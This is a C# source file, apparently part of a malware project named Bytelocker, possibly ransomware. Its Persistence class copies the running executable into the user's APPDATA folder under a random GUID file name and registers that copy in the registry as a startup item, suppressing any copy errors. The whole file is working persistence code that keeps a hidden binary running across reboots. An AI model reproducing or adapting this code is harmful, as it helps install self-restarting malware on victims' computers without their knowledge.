using Bytelocker.Settings;
using ByteLocker.Detection;
using System;
using System.IO;

namespace Bytelocker.Installer
{
    class Persistence
    {
        public static String REGISTRY_STARTUP_VALUE_NAME = "Bytelocker";

        private String path;
        private String new_path;
        private String random_guid;

        public Persistence()
        {
            this.GetRandomGUID();
            this.GetPath();
            this.SetNewPath();
            this.AddToStartup();
            this.CopyFile();
        }

        private void GetRandomGUID()
        {
            this.random_guid = RandomFileNameGenerator.GetRandomGUID();
        }

        private void GetPath()
        {
            this.path = System.Diagnostics.Process.GetCurrentProcess().MainModule.FileName;
        }        

        private void SetNewPath()
        {
            this.new_path = Environment.GetEnvironmentVariable("APPDATA") + @"\" + this.random_guid;
        }

        private void AddToStartup()
        {
            RegistryManager rm = new RegistryManager();
            rm.AddItemToStartup(REGISTRY_STARTUP_VALUE_NAME, this.new_path, "");
        }

        private void CopyFile()
        {
            try
            {
                File.Copy(this.path, this.new_path);
            } catch (Exception)
            {
            }
        }
    }
}
